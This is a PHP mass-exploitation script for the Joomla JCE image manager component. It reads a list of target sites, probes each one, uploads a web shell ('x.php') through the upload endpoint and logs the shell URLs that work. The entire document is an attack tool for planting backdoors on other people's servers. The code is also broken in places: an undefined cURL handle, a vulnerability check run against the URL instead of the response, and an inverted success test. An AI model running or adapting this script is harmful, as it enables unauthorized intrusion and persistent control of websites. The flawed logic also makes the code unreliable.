<?php

// com_jce mass exploiter cli
// coded by Monkey B Luffy
// https://github.com/Florienzh4x
// Special thanks to Tu5b0l3d

set_time_limit(0);

class Florienzh4x_jce{
		
		public $site;

		private $shell = "x.php";

		public function __construct(){
        	if(!file_exists(getcwd()."/".$this->shell)) die("!! File ".$this->shell." Not Found!!");
    	}
    	public function targetsortir(){
			if(!preg_match("/^http:\/\//", $this->site) AND preg_match("/^https:\/\//", $this->site)){
				$targetbersih = "http://".$this->site;
				return $targetbersih;
			} else {
				return $this->site;
			}
		}
		public function simpen($text, $nama){
			$xyz = fopen($nama, "a+");
				   fwrite($xyz, "$text\n");
				   fclose($xyz);
		}
		public function cURL($targetmu, $data = null){
			$get = curl_init();
				   curl_setopt($get, CURLOPT_URL, $targetmu);
				   curl_setopt($get, CURLOPT_RETURNTRANSFER, 1);
				   curl_setopt($get, CURLOPT_FOLLOWLOCATION, 1);
				   curl_setopt($get, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				   curl_setopt($get, CURLOPT_SSL_VERIFYPEER, 0);
				   curl_setopt($get, CURLOPT_SSL_VERIFYHOST, 0);
				   curl_setopt($get, CURLOPT_CONNECTTIMEOUT, 5);
				   curl_setopt($get, CURLOPT_TIMEOUT, 5);
	        if($data !== null) {
	              curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
	              curl_setopt($ch, CURLOPT_POST, 1);
	              curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	        }
			$result = curl_exec($get);
			return $result;
		}
		public function nyerangDuluAH(){
			$korban = $this->site."/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";
			$cekvuln = $this->cURL($korban);
			if(preg_match("/No function call/i", $korban)){
					echo "    Vuln... [OK]\n";
					$this->simpen($this->site, "target-vuln.txt");
					echo "    Uploading... ";
					$postdata_ext = array();
					$postdata_ext['upload-dir'] = "./../../";
					$postdata_ext['upload-overwrite'] = 0;
					$postdata_ext['Filedata'] = "@$this->shell";
					$postdata_ext['action'] = "upload";
					$ngirim = $this->cURL($korban, $postdata_ext);
					if (!preg_match("/\"error\":false/i", $ngirim)) {
						echo "[SUCCESS]\n";
						echo "    Checking Shell... ";
						$domen = parse_url($korban, PHP_URL_HOST);
						$shellpath = "http://".$domen."/x.php";
						$cekshell = file_get_contents($shellpath);
						if (preg_match("/xXx~Monkey~xXx/i", $cekshell)) {
							echo "[FOUND]\n";
							echo "     => ".$shellpath."\n";
							$this->simpen($shellpath, "shell-akses.txt");
						} else {
							echo "[NOT FOUND]\n";
					}
				} else {
					echo "[FAILED]\n";
				}
			} else {
				echo "    Not Vuln... \n";
		} 
	}
}

$jceBanner = "________________________________
< Joomla JCE Massive Exploiter >
< ".get_current_user()."@".gethostname()." > 
--------------------------------
\
 \
     .--.
    |o_o |
    |:_/ |
   //   \ \
  (|     | )
 /\'\_   _/`\
 \___)=(___/

Exploit: /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20
Not use http/https (Ex: www.target.com)";

$ngexploit = new Florienzh4x_jce();

echo $jceBanner."\n\n\n";

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt\n");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." Not Found!!");
$list = explode("\n", file_get_contents($argv[1]));

foreach ($list as $korbanku){
	$ngexploit->site = trim($korbanku);
	$ngexploit->site = $ngexploit->targetsortir();

    echo "[=] Target: ".$korbanku."\n";
    $ngexploit->nyerangDuluAH();
}
?>